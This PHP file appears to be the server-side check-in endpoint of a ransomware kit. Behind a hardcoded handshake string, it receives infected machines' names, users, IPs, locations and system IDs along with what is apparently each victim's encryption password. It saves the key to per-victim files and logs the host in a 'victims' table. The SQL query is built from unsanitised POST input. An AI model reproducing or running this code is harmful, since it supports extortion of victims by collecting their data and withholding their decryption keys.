
<?php

include("database/db_conection.php");
if(isset($_POST['handshake']))
{
$check=$_POST['handshake'];
if ($check=="jasmin@123")
{

    $machine_name=$_POST['machine_name'];
    $computer_user=$_POST['computer_user'];
	$os=$_POST['os'];
    $date=$_POST['date'];
	$time=$_POST['time'];
	$systemid=$_POST['systemid'];
	$location=$_POST['location'];
	$ip=$_POST['ip'];
	$password=$_POST['password'];
	$location=$_POST['location'];
	$newtime = date("H-i-s", strtotime($time));  
	$password_folder_name = $machine_name. '_' .$computer_user;
	$password_file_name =  $newtime. '_' .$systemid;
	$password_file_extension = $password_file_name. "." ."flora";
	if (!file_exists('./passwords'))
						mkdir ('./passwords');

					mkdir ('./passwords/' . $password_folder_name); 
					file_put_contents("./passwords/{$password_folder_name}/". $password_file_extension , $password);
					
    
//insert the user into the database.
    $insert_user="insert into victims (machine_name,computer_user,os,date,time,ip,location,systemid,password) VALUE ('$machine_name','$computer_user','$os','$date','$time','$ip','$location','$systemid','$password')";
    if(mysqli_query($dbcon,$insert_user))
    {
        echo "handshake compeleted";
    }
	
}}

else echo "You Are Not My Jasmin ! Get Lost.";
?>